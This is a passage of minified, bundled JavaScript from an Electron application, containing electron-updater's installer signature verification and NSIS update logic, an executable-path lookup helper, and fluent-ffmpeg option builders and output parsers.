                `Sign verification failed, installer signed with incorrect certificate: ${b}`
              ),
                s(b);
            } catch (S) {
              r(n, S, null, u), s(null);
              return;
            }
          }
        );
    });
  }
  function t(e) {
    const o = JSON.parse(e);
    delete o.PrivateKey, delete o.IsOSBinary, delete o.SignatureType;
    const n = o.SignerCertificate;
    return (
      n != null &&
      (delete n.Archived,
        delete n.Extensions,
        delete n.Handle,
        delete n.HasPrivateKey,
        delete n.SubjectName),
      o
    );
  }
  function r(e, o, n, s) {
    if (l()) {
      e.warn(
        `Cannot execute Get-AuthenticodeSignature: ${o || n
        }. Ignoring signature validation due to unsupported powershell version. Please upgrade to powershell 3 or higher.`
      );
      return;
    }
    try {
      (0, i.execFileSync)(
        "powershell.exe",
        ["-NoProfile", "-NonInteractive", "-Command", "ConvertTo-Json test"],
        { timeout: 10 * 1e3 }
      );
    } catch (u) {
      e.warn(
        `Cannot execute ConvertTo-Json: ${u.message}. Ignoring signature validation due to unsupported powershell version. Please upgrade to powershell 3 or higher.`
      );
      return;
    }
    o != null && s(o),
      n &&
      s(
        new Error(
          `Cannot execute Get-AuthenticodeSignature, stderr: ${n}. Failing signature validation due to unknown stderr.`
        )
      );
  }
  function l() {
    const e = c.release();
    return e.startsWith("6.") && !e.startsWith("6.3");
  }
  return Gr;
}
var Zu;
function el() {
  if (Zu) return wr;
  (Zu = 1),
    Object.defineProperty(wr, "__esModule", { value: !0 }),
    (wr.NsisUpdater = void 0);
  const a = Be(),
    i = ye,
    c = Yt(),
    h = tc(),
    f = Lt(),
    t = nt(),
    r = Et(),
    l = Rd(),
    e = Gt;
  let o = class extends c.BaseUpdater {
    constructor(s, u) {
      super(s, u),
        (this._verifyUpdateCodeSignature = (m, E) =>
          (0, l.verifySignature)(m, E, this._logger));
    }
    get verifyUpdateCodeSignature() {
      return this._verifyUpdateCodeSignature;
    }
    set verifyUpdateCodeSignature(s) {
      s && (this._verifyUpdateCodeSignature = s);
    }
    doDownloadUpdate(s) {
      const u = s.updateInfoAndProvider.provider,
        m = (0, t.findFile)(
          u.resolveFiles(s.updateInfoAndProvider.info),
          "exe"
        );
      return this.executeDownload({
        fileExtension: "exe",
        downloadUpdateOptions: s,
        fileInfo: m,
        task: async (E, y, p, A) => {
          const S = m.packageInfo,
            b = S != null && p != null;
          if (b && s.disableWebInstaller)
            throw (0, a.newError)(
              `Unable to download new version ${s.updateInfoAndProvider.info.version}. Web Installers are disabled`,
              "ERR_UPDATER_WEB_INSTALLER_DISABLED"
            );
          !b &&
            !s.disableWebInstaller &&
            this._logger.warn(
              "disableWebInstaller is set to false, you should set it to true if you do not plan on using a web installer. This will default to true in a future version."
            ),
            (b ||
              s.disableDifferentialDownload ||
              (await this.differentialDownloadInstaller(
                m,
                s,
                E,
                u,
                a.CURRENT_APP_INSTALLER_FILE_NAME
              ))) &&
            (await this.httpExecutor.download(m.url, E, y));
          const R = await this.verifySignature(E);
          if (R != null)
            throw (
              (await A(),
                (0, a.newError)(
                  `New version ${s.updateInfoAndProvider.info.version} is not signed by the application owner: ${R}`,
                  "ERR_UPDATER_INVALID_SIGNATURE"
                ))
            );
          if (b && (await this.differentialDownloadWebPackage(s, S, p, u)))
            try {
              await this.httpExecutor.download(new e.URL(S.path), p, {
                headers: s.requestHeaders,
                cancellationToken: s.cancellationToken,
                sha512: S.sha512,
              });
            } catch (C) {
              try {
                await (0, r.unlink)(p);
              } catch { }
              throw C;
            }
        },
      });
    }
    async verifySignature(s) {
      let u;
      try {
        if (((u = (await this.configOnDisk.value).publisherName), u == null))
          return null;
      } catch (m) {
        if (m.code === "ENOENT") return null;
        throw m;
      }
      return await this._verifyUpdateCodeSignature(
        Array.isArray(u) ? u : [u],
        s
      );
    }
    doInstall(s) {
      const u = this.installerPath;
      if (u == null)
        return (
          this.dispatchError(
            new Error("No valid update available, can't quit and install")
          ),
          !1
        );
      const m = ["--updated"];
      s.isSilent && m.push("/S"),
        s.isForceRunAfter && m.push("--force-run"),
        this.installDirectory && m.push(`/D=${this.installDirectory}`);
      const E =
        this.downloadedUpdateHelper == null
          ? null
          : this.downloadedUpdateHelper.packageFile;
      E != null && m.push(`--package-file=${E}`);
      const y = () => {
        this.spawnLog(
          i.join(process.resourcesPath, "elevate.exe"),
          [u].concat(m)
        ).catch((p) => this.dispatchError(p));
      };
      return s.isAdminRightsRequired
        ? (this._logger.info(
          "isAdminRightsRequired is set to true, run installer using elevate.exe"
        ),
          y(),
          !0)
        : (this.spawnLog(u, m).catch((p) => {
          const A = p.code;
          this._logger.info(
            `Cannot run installer: error code: ${A}, error message: "${p.message}", will be executed again using elevate if EACCES, and will try to use electron.shell.openItem if ENOENT`
          ),
            A === "UNKNOWN" || A === "EACCES"
              ? y()
              : A === "ENOENT"
                ? he.shell.openPath(u).catch((S) => this.dispatchError(S))
                : this.dispatchError(p);
        }),
          !0);
    }
    async differentialDownloadWebPackage(s, u, m, E) {
      if (u.blockMapSize == null) return !0;
      try {
        const y = {
          newUrl: new e.URL(u.path),
          oldFile: i.join(
            this.downloadedUpdateHelper.cacheDir,
            a.CURRENT_APP_PACKAGE_FILE_NAME
          ),
          logger: this._logger,
          newFile: m,
          requestHeaders: this.requestHeaders,
          isUseMultipleRangeRequest: E.isUseMultipleRangeRequest,
          cancellationToken: s.cancellationToken,
        };
        this.listenerCount(f.DOWNLOAD_PROGRESS) > 0 &&
          (y.onProgress = (p) => this.emit(f.DOWNLOAD_PROGRESS, p)),
          await new h.FileWithEmbeddedBlockMapDifferentialDownloader(
            u,
            this.httpExecutor,
            y
          ).download();
      } catch (y) {
        return (
          this._logger.error(
            `Cannot download differentially, fallback to full download: ${y.stack || y
            }`
          ),
          process.platform === "win32"
        );
      }
      return !1;
    }
  };
  return (wr.NsisUpdater = o), wr;
}
var tl;
function Pd() {
  return (
    tl ||
    ((tl = 1),
      (function (a) {
        var i =
          (Pt && Pt.__createBinding) ||
          (Object.create
            ? function (p, A, S, b) {
              b === void 0 && (b = S);
              var R = Object.getOwnPropertyDescriptor(A, S);
              (!R ||
                ("get" in R
                  ? !A.__esModule
                  : R.writable || R.configurable)) &&
                (R = {
                  enumerable: !0,
                  get: function () {
                    return A[S];
                  },
                }),
                Object.defineProperty(p, b, R);
            }
            : function (p, A, S, b) {
              b === void 0 && (b = S), (p[b] = A[S]);
            }),
          c =
            (Pt && Pt.__exportStar) ||
            function (p, A) {
              for (var S in p)
                S !== "default" &&
                  !Object.prototype.hasOwnProperty.call(A, S) &&
                  i(A, p, S);
            };
        Object.defineProperty(a, "__esModule", { value: !0 }),
          (a.NsisUpdater =
            a.MacUpdater =
            a.RpmUpdater =
            a.PacmanUpdater =
            a.DebUpdater =
            a.AppImageUpdater =
            a.Provider =
            a.NoOpLogger =
            a.AppUpdater =
            a.BaseUpdater =
            void 0);
        const h = Et(),
          f = ye;
        var t = Yt();
        Object.defineProperty(a, "BaseUpdater", {
          enumerable: !0,
          get: function () {
            return t.BaseUpdater;
          },
        });
        var r = Mo();
        Object.defineProperty(a, "AppUpdater", {
          enumerable: !0,
          get: function () {
            return r.AppUpdater;
          },
        }),
          Object.defineProperty(a, "NoOpLogger", {
            enumerable: !0,
            get: function () {
              return r.NoOpLogger;
            },
          });
        var l = nt();
        Object.defineProperty(a, "Provider", {
          enumerable: !0,
          get: function () {
            return l.Provider;
          },
        });
        var e = Hu();
        Object.defineProperty(a, "AppImageUpdater", {
          enumerable: !0,
          get: function () {
            return e.AppImageUpdater;
          },
        });
        var o = Vu();
        Object.defineProperty(a, "DebUpdater", {
          enumerable: !0,
          get: function () {
            return o.DebUpdater;
          },
        });
        var n = zu();
        Object.defineProperty(a, "PacmanUpdater", {
          enumerable: !0,
          get: function () {
            return n.PacmanUpdater;
          },
        });
        var s = Ku();
        Object.defineProperty(a, "RpmUpdater", {
          enumerable: !0,
          get: function () {
            return s.RpmUpdater;
          },
        });
        var u = Ju();
        Object.defineProperty(a, "MacUpdater", {
          enumerable: !0,
          get: function () {
            return u.MacUpdater;
          },
        });
        var m = el();
        Object.defineProperty(a, "NsisUpdater", {
          enumerable: !0,
          get: function () {
            return m.NsisUpdater;
          },
        }),
          c(Lt(), a);
        let E;
        function y() {
          if (process.platform === "win32") E = new (el().NsisUpdater)();
          else if (process.platform === "darwin") E = new (Ju().MacUpdater)();
          else {
            E = new (Hu().AppImageUpdater)();
            try {
              const p = f.join(process.resourcesPath, "package-type");
              if (!(0, h.existsSync)(p)) return E;
              console.info(
                "Checking for beta autoupdate feature for deb/rpm distributions"
              );
              const A = (0, h.readFileSync)(p).toString().trim();
              switch ((console.info("Found package-type:", A), A)) {
                case "deb":
                  E = new (Vu().DebUpdater)();
                  break;
                case "rpm":
                  E = new (Ku().RpmUpdater)();
                  break;
                case "pacman":
                  E = new (zu().PacmanUpdater)();
                  break;
                default:
                  break;
              }
            } catch (p) {
              console.warn(
                "Unable to detect 'package-type' for autoUpdater (beta rpm/deb support). If you'd like to expand support, please consider contributing to electron-builder",
                p.message
              );
            }
          }
          return E;
        }
        Object.defineProperty(a, "autoUpdater", {
          enumerable: !0,
          get: () => E || y(),
        });
      })(Pt)),
    Pt
  );
}
var ut = Pd(),
  ro = { exports: {} },
  no,
  rl;
function Cd() {
  if (rl) return no;
  (rl = 1), (no = h), (h.sync = f);
  var a = be;
  function i(t, r) {
    var l = r.pathExt !== void 0 ? r.pathExt : process.env.PATHEXT;
    if (!l || ((l = l.split(";")), l.indexOf("") !== -1)) return !0;
    for (var e = 0; e < l.length; e++) {
      var o = l[e].toLowerCase();
      if (o && t.substr(-o.length).toLowerCase() === o) return !0;
    }
    return !1;
  }
  function c(t, r, l) {
    return !t.isSymbolicLink() && !t.isFile() ? !1 : i(r, l);
  }
  function h(t, r, l) {
    a.stat(t, function (e, o) {
      l(e, e ? !1 : c(o, t, r));
    });
  }
  function f(t, r) {
    return c(a.statSync(t), t, r);
  }
  return no;
}
var io, nl;
function Id() {
  if (nl) return io;
  (nl = 1), (io = i), (i.sync = c);
  var a = be;
  function i(t, r, l) {
    a.stat(t, function (e, o) {
      l(e, e ? !1 : h(o, r));
    });
  }
  function c(t, r) {
    return h(a.statSync(t), r);
  }
  function h(t, r) {
    return t.isFile() && f(t, r);
  }
  function f(t, r) {
    var l = t.mode,
      e = t.uid,
      o = t.gid,
      n = r.uid !== void 0 ? r.uid : process.getuid && process.getuid(),
      s = r.gid !== void 0 ? r.gid : process.getgid && process.getgid(),
      u = parseInt("100", 8),
      m = parseInt("010", 8),
      E = parseInt("001", 8),
      y = u | m,
      p =
        l & E || (l & m && o === s) || (l & u && e === n) || (l & y && n === 0);
    return p;
  }
  return io;
}
var oo, il;
function Od() {
  if (il) return oo;
  il = 1;
  var a;
  process.platform === "win32" || rt.TESTING_WINDOWS ? (a = Cd()) : (a = Id()),
    (oo = i),
    (i.sync = c);
  function i(h, f, t) {
    if ((typeof f == "function" && ((t = f), (f = {})), !t)) {
      if (typeof Promise != "function")
        throw new TypeError("callback not provided");
      return new Promise(function (r, l) {
        i(h, f || {}, function (e, o) {
          e ? l(e) : r(o);
        });
      });
    }
    a(h, f || {}, function (r, l) {
      r &&
        (r.code === "EACCES" || (f && f.ignoreErrors)) &&
        ((r = null), (l = !1)),
        t(r, l);
    });
  }
  function c(h, f) {
    try {
      return a.sync(h, f || {});
    } catch (t) {
      if ((f && f.ignoreErrors) || t.code === "EACCES") return !1;
      throw t;
    }
  }
  return oo;
}
var ao, ol;
function Dd() {
  if (ol) return ao;
  (ol = 1), (ao = r), (r.sync = l);
  var a =
    process.platform === "win32" ||
    process.env.OSTYPE === "cygwin" ||
    process.env.OSTYPE === "msys",
    i = ye,
    c = a ? ";" : ":",
    h = Od();
  function f(e) {
    var o = new Error("not found: " + e);
    return (o.code = "ENOENT"), o;
  }
  function t(e, o) {
    var n = o.colon || c,
      s = o.path || process.env.PATH || "",
      u = [""];
    s = s.split(n);
    var m = "";
    return (
      a &&
      (s.unshift(process.cwd()),
        (m = o.pathExt || process.env.PATHEXT || ".EXE;.CMD;.BAT;.COM"),
        (u = m.split(n)),
        e.indexOf(".") !== -1 && u[0] !== "" && u.unshift("")),
      (e.match(/\//) || (a && e.match(/\\/))) && (s = [""]),
      { env: s, ext: u, extExe: m }
    );
  }
  function r(e, o, n) {
    typeof o == "function" && ((n = o), (o = {}));
    var s = t(e, o),
      u = s.env,
      m = s.ext,
      E = s.extExe,
      y = [];
    (function p(A, S) {
      if (A === S) return o.all && y.length ? n(null, y) : n(f(e));
      var b = u[A];
      b.charAt(0) === '"' && b.slice(-1) === '"' && (b = b.slice(1, -1));
      var R = i.join(b, e);
      !b && /^\.[\\\/]/.test(e) && (R = e.slice(0, 2) + R),
        (function C(v, w) {
          if (v === w) return p(A + 1, S);
          var _ = m[v];
          h(R + _, { pathExt: E }, function (g, D) {
            if (!g && D)
              if (o.all) y.push(R + _);
              else return n(null, R + _);
            return C(v + 1, w);
          });
        })(0, m.length);
    })(0, u.length);
  }
  function l(e, o) {
    o = o || {};
    for (
      var n = t(e, o),
      s = n.env,
      u = n.ext,
      m = n.extExe,
      E = [],
      y = 0,
      p = s.length;
      y < p;
      y++
    ) {
      var A = s[y];
      A.charAt(0) === '"' && A.slice(-1) === '"' && (A = A.slice(1, -1));
      var S = i.join(A, e);
      !A && /^\.[\\\/]/.test(e) && (S = e.slice(0, 2) + S);
      for (var b = 0, R = u.length; b < R; b++) {
        var C = S + u[b],
          v;
        try {
          if (((v = h.sync(C, { pathExt: m })), v))
            if (o.all) E.push(C);
            else return C;
        } catch { }
      }
    }
    if (o.all && E.length) return E;
    if (o.nothrow) return null;
    throw f(e);
  }
  return ao;
}
var al;
function pt() {
  if (al) return ro.exports;
  (al = 1), Nt.exec;
  var a = Ar.platform().match(/win(32|64)/),
    i = Dd(),
    c = /\r\n|\r|\n/g,
    h = /^\[?(.*?)\]?$/,
    f = /[,]/,
    t = {};
  function r(e) {
    var o = {};
    e = e.replace(/=\s+/g, "=").trim();
    for (var n = e.split(" "), s = 0; s < n.length; s++) {
      var u = n[s].split("=", 2),
        m = u[0],
        E = u[1];
      if (typeof E > "u") return null;
      o[m] = E;
    }
    return o;
  }
  var l = (ro.exports = {
    isWindows: a,
    streamRegexp: h,
    copy: function (e, o) {
      Object.keys(e).forEach(function (n) {
        o[n] = e[n];
      });
    },
    args: function () {
      var e = [],
        o = function () {
          arguments.length === 1 && Array.isArray(arguments[0])
            ? (e = e.concat(arguments[0]))
            : (e = e.concat([].slice.call(arguments)));
        };
      return (
        (o.clear = function () {
          e = [];
        }),
        (o.get = function () {
          return e;
        }),
        (o.find = function (n, s) {
          var u = e.indexOf(n);
          if (u !== -1) return e.slice(u + 1, u + 1 + (s || 0));
        }),
        (o.remove = function (n, s) {
          var u = e.indexOf(n);
          u !== -1 && e.splice(u, (s || 0) + 1);
        }),
        (o.clone = function () {
          var n = l.args();
          return n(e), n;
        }),
        o
      );
    },
    makeFilterStrings: function (e) {
      return e.map(function (o) {
        if (typeof o == "string") return o;
        var n = "";
        return (
          Array.isArray(o.inputs)
            ? (n += o.inputs
              .map(function (s) {
                return s.replace(h, "[$1]");
              })
              .join(""))
            : typeof o.inputs == "string" && (n += o.inputs.replace(h, "[$1]")),
          (n += o.filter),
          o.options &&
          (typeof o.options == "string" || typeof o.options == "number"
            ? (n += "=" + o.options)
            : Array.isArray(o.options)
              ? (n +=
                "=" +
                o.options
                  .map(function (s) {
                    return typeof s == "string" && s.match(f)
                      ? "'" + s + "'"
                      : s;
                  })
                  .join(":"))
              : Object.keys(o.options).length &&
              (n +=
                "=" +
                Object.keys(o.options)
                  .map(function (s) {
                    var u = o.options[s];
                    return (
                      typeof u == "string" &&
                      u.match(f) &&
                      (u = "'" + u + "'"),
                      s + "=" + u
                    );
                  })
                  .join(":"))),
          Array.isArray(o.outputs)
            ? (n += o.outputs
              .map(function (s) {
                return s.replace(h, "[$1]");
              })
              .join(""))
            : typeof o.outputs == "string" &&
            (n += o.outputs.replace(h, "[$1]")),
          n
        );
      });
    },
    which: function (e, o) {
      if (e in t) return o(null, t[e]);
      i(e, function (n, s) {
        if (n) return o(null, (t[e] = ""));
        o(null, (t[e] = s));
      });
    },
    timemarkToSeconds: function (e) {
      if (typeof e == "number") return e;
      if (e.indexOf(":") === -1 && e.indexOf(".") >= 0) return Number(e);
      var o = e.split(":"),
        n = Number(o.pop());
      return (
        o.length && (n += Number(o.pop()) * 60),
        o.length && (n += Number(o.pop()) * 3600),
        n
      );
    },
    extractCodecData: function (e, o, n) {
      var s = /Input #[0-9]+, ([^ ]+),/,
        u = /Duration\: ([^,]+)/,
        m = /Audio\: (.*)/,
        E = /Video\: (.*)/;
      "inputStack" in n ||
        ((n.inputStack = []), (n.inputIndex = -1), (n.inInput = !1));
      var y = n.inputStack,
        p = n.inputIndex,
        A = n.inInput,
        S,
        b,
        R,
        C;
      if ((S = o.match(s)))
        (A = n.inInput = !0),
          (p = n.inputIndex = n.inputIndex + 1),
          (y[p] = { format: S[1], audio: "", video: "", duration: "" });
      else if (A && (b = o.match(u))) y[p].duration = b[1];
      else if (A && (R = o.match(m)))
        (R = R[1].split(", ")), (y[p].audio = R[0]), (y[p].audio_details = R);
      else if (A && (C = o.match(E)))
        (C = C[1].split(", ")), (y[p].video = C[0]), (y[p].video_details = C);
      else if (/Output #\d+/.test(o)) A = n.inInput = !1;
      else if (/Stream mapping:|Press (\[q\]|ctrl-c) to stop/.test(o))
        return e.emit.apply(e, ["codecData"].concat(y)), !0;
      return !1;
    },
    extractProgress: function (e, o) {
      var n = r(o);
      if (n) {
        var s = {
          frames: parseInt(n.frame, 10),
          currentFps: parseInt(n.fps, 10),
          currentKbps: n.bitrate
            ? parseFloat(n.bitrate.replace("kbits/s", ""))
            : 0,
          targetSize: parseInt(n.size || n.Lsize, 10),
          timemark: n.time,
        };
        if (
          e._ffprobeData &&
          e._ffprobeData.format &&
          e._ffprobeData.format.duration
        ) {
          var u = Number(e._ffprobeData.format.duration);
          isNaN(u) || (s.percent = (l.timemarkToSeconds(s.timemark) / u) * 100);
        }
        e.emit("progress", s);
      }
    },
    extractError: function (e) {
      return e.split(c).reduce(function (o, n) {
        return n.charAt(0) === " " || n.charAt(0) === "[" ? [] : (o.push(n), o);
      }, []).join(`
`);
    },
    linesRing: function (e) {
      var o = [],
        n = [],
        s = null,
        u = !1,
        m = e - 1;
      function E(y) {
        o.forEach(function (p) {
          p(y);
        });
      }
      return {
        callback: function (y) {
          n.forEach(function (p) {
            y(p);
          }),
            o.push(y);
        },
        append: function (y) {
          if (
            !u &&
            (y instanceof Buffer && (y = "" + y), !(!y || y.length === 0))
          ) {
            var p = y.split(c);
            p.length === 1
              ? s !== null
                ? (s = s + p.shift())
                : (s = p.shift())
              : (s !== null && ((s = s + p.shift()), E(s), n.push(s)),
                (s = p.pop()),
                p.forEach(function (A) {
                  E(A), n.push(A);
                }),
                m > -1 && n.length > m && n.splice(0, n.length - m));
          }
        },
        get: function () {
          return s !== null
            ? n.concat([s]).join(`
`)
            : n.join(`
`);
        },
        close: function () {
          u ||
            (s !== null &&
              (E(s),
                n.push(s),
                m > -1 && n.length > m && n.shift(),
                (s = null)),
              (u = !0));
        },
      };
    },
  });
  return ro.exports;
}
var so, sl;
function xd() {
  if (sl) return so;
  sl = 1;
  var a = pt();
  return (
    (so = function (i) {
      (i.mergeAdd =
        i.addInput =
        i.input =
        function (c) {
          var h = !1,
            f = !1;
          if (typeof c != "string") {
            if (!("readable" in c) || !c.readable)
              throw new Error("Invalid input");
            var t = this._inputs.some(function (l) {
              return l.isStream;
            });
            if (t) throw new Error("Only one input stream is supported");
            (f = !0), c.pause();
          } else {
            var r = c.match(/^([a-z]{2,}):/i);
            h = !r || r[0] === "file";
          }
          return (
            this._inputs.push(
              (this._currentInput = {
                source: c,
                isFile: h,
                isStream: f,
                options: a.args(),
              })
            ),
            this
          );
        }),
        (i.withInputFormat =
          i.inputFormat =
          i.fromFormat =
          function (c) {
            if (!this._currentInput) throw new Error("No input specified");
            return this._currentInput.options("-f", c), this;
          }),
        (i.withInputFps =
          i.withInputFPS =
          i.withFpsInput =
          i.withFPSInput =
          i.inputFPS =
          i.inputFps =
          i.fpsInput =
          i.FPSInput =
          function (c) {
            if (!this._currentInput) throw new Error("No input specified");
            return this._currentInput.options("-r", c), this;
          }),
        (i.nativeFramerate =
          i.withNativeFramerate =
          i.native =
          function () {
            if (!this._currentInput) throw new Error("No input specified");
            return this._currentInput.options("-re"), this;
          }),
        (i.setStartTime = i.seekInput =
          function (c) {
            if (!this._currentInput) throw new Error("No input specified");
            return this._currentInput.options("-ss", c), this;
          }),
        (i.loop = function (c) {
          if (!this._currentInput) throw new Error("No input specified");
          return (
            this._currentInput.options("-loop", "1"),
            typeof c < "u" && this.duration(c),
            this
          );
        });
    }),
    so
  );
}
var uo, ul;
function Nd() {
  if (ul) return uo;
  ul = 1;
  var a = pt();
  return (
    (uo = function (i) {
      (i.withNoAudio = i.noAudio =
        function () {
          return (
            this._currentOutput.audio.clear(),
            this._currentOutput.audioFilters.clear(),
            this._currentOutput.audio("-an"),
            this
          );
        }),
        (i.withAudioCodec = i.audioCodec =
          function (c) {
            return this._currentOutput.audio("-acodec", c), this;
          }),
        (i.withAudioBitrate = i.audioBitrate =
          function (c) {
            return (
              this._currentOutput.audio("-b:a", ("" + c).replace(/k?$/, "k")),
              this
            );
          }),
        (i.withAudioChannels = i.audioChannels =
          function (c) {
            return this._currentOutput.audio("-ac", c), this;
          }),
        (i.withAudioFrequency = i.audioFrequency =
          function (c) {
            return this._currentOutput.audio("-ar", c), this;
          }),
        (i.withAudioQuality = i.audioQuality =
          function (c) {
            return this._currentOutput.audio("-aq", c), this;
          }),
        (i.withAudioFilter =
          i.withAudioFilters =
          i.audioFilter =
          i.audioFilters =
          function (c) {
            return (
              arguments.length > 1 && (c = [].slice.call(arguments)),
              Array.isArray(c) || (c = [c]),
              this._currentOutput.audioFilters(a.makeFilterStrings(c)),
              this
            );
          });
    }),
    uo
  );
}
var lo, ll;
function Fd() {
  if (ll) return lo;
  ll = 1;
  var a = pt();
  return (
    (lo = function (i) {
      (i.withNoVideo = i.noVideo =
        function () {
          return (
            this._currentOutput.video.clear(),
            this._currentOutput.videoFilters.clear(),
            this._currentOutput.video("-vn"),
            this
          );
        }),
        (i.withVideoCodec = i.videoCodec =
          function (c) {
            return this._currentOutput.video("-vcodec", c), this;
          }),
        (i.withVideoBitrate = i.videoBitrate =
          function (c, h) {
            return (
              (c = ("" + c).replace(/k?$/, "k")),
              this._currentOutput.video("-b:v", c),
              h &&
              this._currentOutput.video(
                "-maxrate",
                c,
                "-minrate",
                c,
                "-bufsize",
                "3M"
              ),
              this
            );
          }),
        (i.withVideoFilter =
          i.withVideoFilters =
          i.videoFilter =
          i.videoFilters =
          function (c) {
            return (
              arguments.length > 1 && (c = [].slice.call(arguments)),
              Array.isArray(c) || (c = [c]),
              this._currentOutput.videoFilters(a.makeFilterStrings(c)),
              this
            );
          }),
        (i.withOutputFps =
          i.withOutputFPS =
          i.withFpsOutput =
          i.withFPSOutput =
          i.withFps =
          i.withFPS =
          i.outputFPS =
          i.outputFps =
          i.fpsOutput =
          i.FPSOutput =
          i.fps =
          i.FPS =
          function (c) {
            return this._currentOutput.video("-r", c), this;
          }),
        (i.takeFrames =
          i.withFrames =
          i.frames =
          function (c) {
            return this._currentOutput.video("-vframes", c), this;
          });
    }),
    lo
  );
}
var co, cl;
function $d() {
  if (cl) return co;
  cl = 1;
  function a(c, h, f, t) {
    return [
      {
        filter: "scale",
        options: {
          w: "if(gt(a," + f + ")," + c + ",trunc(" + h + "*a/2)*2)",
          h: "if(lt(a," + f + ")," + h + ",trunc(" + c + "/a/2)*2)",
        },
      },
      {
        filter: "pad",
        options: {
          w: c,
          h,
          x: "if(gt(a," + f + "),0,(" + c + "-iw)/2)",
          y: "if(lt(a," + f + "),0,(" + h + "-ih)/2)",
          color: t,
        },
      },
    ];
  }
  function i(c, h, f) {
    var t = (c.sizeData = c.sizeData || {});
    if (((t[h] = f), !("size" in t))) return [];
    var r = t.size.match(/([0-9]+)x([0-9]+)/),
      l = t.size.match(/([0-9]+)x\?/),
      e = t.size.match(/\?x([0-9]+)/),
      o = t.size.match(/\b([0-9]{1,3})%/),
      n,
      s,
      u;
    if (o) {
      var m = Number(o[1]) / 100;
      return [
        {
          filter: "scale",
          options: {
            w: "trunc(iw*" + m + "/2)*2",
            h: "trunc(ih*" + m + "/2)*2",
          },
        },
      ];
    } else {
      if (r)
        return (
          (n = Math.round(Number(r[1]) / 2) * 2),
          (s = Math.round(Number(r[2]) / 2) * 2),
          (u = n / s),
          t.pad
            ? a(n, s, u, t.pad)
            : [{ filter: "scale", options: { w: n, h: s } }]
        );
      if (l || e)
        return "aspect" in t
          ? ((n = l ? l[1] : Math.round(Number(e[1]) * t.aspect)),
            (s = e ? e[1] : Math.round(Number(l[1]) / t.aspect)),
            (n = Math.round(n / 2) * 2),
            (s = Math.round(s / 2) * 2),
            t.pad
              ? a(n, s, t.aspect, t.pad)
              : [{ filter: "scale", options: { w: n, h: s } }])
          : l
            ? [
              {
                filter: "scale",
                options: {
                  w: Math.round(Number(l[1]) / 2) * 2,
                  h: "trunc(ow/a/2)*2",
                },
              },
            ]
            : [
              {
                filter: "scale",
                options: {
                  w: "trunc(oh*a/2)*2",
                  h: Math.round(Number(e[1]) / 2) * 2,
                },
              },
            ];
      throw new Error("Invalid size specified: " + t.size);
    }
  }
  return (
    (co = function (c) {
      (c.keepPixelAspect =
        c.keepDisplayAspect =
        c.keepDisplayAspectRatio =
        c.keepDAR =
        function () {
          return this.videoFilters([
            {
              filter: "scale",
              options: {
                w: "if(gt(sar,1),iw*sar,iw)",
                h: "if(lt(sar,1),ih/sar,ih)",
              },
            },
            { filter: "setsar", options: "1" },
          ]);
        }),
        (c.withSize =
          c.setSize =
          c.size =
          function (h) {
            var f = i(this._currentOutput, "size", h);
            return (
              this._currentOutput.sizeFilters.clear(),
              this._currentOutput.sizeFilters(f),
              this
            );
          }),
        (c.withAspect =
          c.withAspectRatio =
          c.setAspect =
          c.setAspectRatio =
          c.aspect =
          c.aspectRatio =
          function (h) {
            var f = Number(h);
            if (isNaN(f)) {
              var t = h.match(/^(\d+):(\d+)$/);
              if (t) f = Number(t[1]) / Number(t[2]);
              else throw new Error("Invalid aspect ratio: " + h);
            }
            var r = i(this._currentOutput, "aspect", f);
            return (
              this._currentOutput.sizeFilters.clear(),
              this._currentOutput.sizeFilters(r),
              this
            );
          }),
        (c.applyAutopadding =
          c.applyAutoPadding =
          c.applyAutopad =
          c.applyAutoPad =
          c.withAutopadding =
          c.withAutoPadding =
          c.withAutopad =
          c.withAutoPad =
          c.autoPad =
          c.autopad =
          function (h, f) {
            typeof h == "string" && ((f = h), (h = !0)),
              typeof h > "u" && (h = !0);
            var t = i(this._currentOutput, "pad", h ? f || "black" : !1);
            return (
              this._currentOutput.sizeFilters.clear(),
              this._currentOutput.sizeFilters(t),
              this
            );
          });
    }),
    co
  );
}
var fo, fl;
function Ld() {
  if (fl) return fo;
  fl = 1;
  var a = pt();
  return (
    (fo = function (i) {
      (i.addOutput = i.output =
        function (c, h) {
          var f = !1;
          if (!c && this._currentOutput) throw new Error("Invalid output");
          if (c && typeof c != "string") {
            if (!("writable" in c) || !c.writable)
              throw new Error("Invalid output");
          } else if (typeof c == "string") {
            var t = c.match(/^([a-z]{2,}):/i);
            f = !t || t[0] === "file";
          }
          if (c && !("target" in this._currentOutput))
            (this._currentOutput.target = c),
              (this._currentOutput.isFile = f),
              (this._currentOutput.pipeopts = h || {});
          else {
            if (c && typeof c != "string") {
              var r = this._outputs.some(function (e) {
                return typeof e.target != "string";
              });
              if (r) throw new Error("Only one output stream is supported");
            }
            this._outputs.push(
              (this._currentOutput = {
                target: c,
                isFile: f,
                flags: {},
                pipeopts: h || {},
              })
            );
            var l = this;
            [
              "audio",
              "audioFilters",
              "video",
              "videoFilters",
              "sizeFilters",
              "options",
            ].forEach(function (e) {
              l._currentOutput[e] = a.args();
            }),
              c || delete this._currentOutput.target;
          }
          return this;
        }),
        (i.seekOutput = i.seek =
          function (c) {
            return this._currentOutput.options("-ss", c), this;
          }),
        (i.withDuration =
          i.setDuration =
          i.duration =
          function (c) {
            return this._currentOutput.options("-t", c), this;
          }),
        (i.toFormat =
          i.withOutputFormat =
          i.outputFormat =
          i.format =
          function (c) {
            return this._currentOutput.options("-f", c), this;
          }),
        (i.map = function (c) {
          return (
            this._currentOutput.options(
              "-map",
              c.replace(a.streamRegexp, "[$1]")
            ),
            this
          );
        }),
        (i.updateFlvMetadata = i.flvmeta =
          function () {
            return (this._currentOutput.flags.flvmeta = !0), this;
          });
    }),
    fo
  );
}
var ho, dl;
function Ud() {
  if (dl) return ho;
  dl = 1;
  var a = pt();
  return (
    (ho = function (i) {
      (i.addInputOption =
        i.addInputOptions =
        i.withInputOption =
        i.withInputOptions =
        i.inputOption =
        i.inputOptions =
        function (c) {
          if (!this._currentInput) throw new Error("No input specified");
          var h = !0;
          return (
            arguments.length > 1 &&
            ((c = [].slice.call(arguments)), (h = !1)),
            Array.isArray(c) || (c = [c]),
            this._currentInput.options(
              c.reduce(function (f, t) {
                var r = String(t).split(" ");
                return (
                  h && r.length === 2 ? f.push(r[0], r[1]) : f.push(t), f
                );
              }, [])
            ),
            this
          );
        }),
        (i.addOutputOption =
          i.addOutputOptions =
          i.addOption =
          i.addOptions =
          i.withOutputOption =
          i.withOutputOptions =
          i.withOption =
          i.withOptions =
          i.outputOption =
          i.outputOptions =
          function (c) {
            var h = !0;
            return (
              arguments.length > 1 &&
              ((c = [].slice.call(arguments)), (h = !1)),
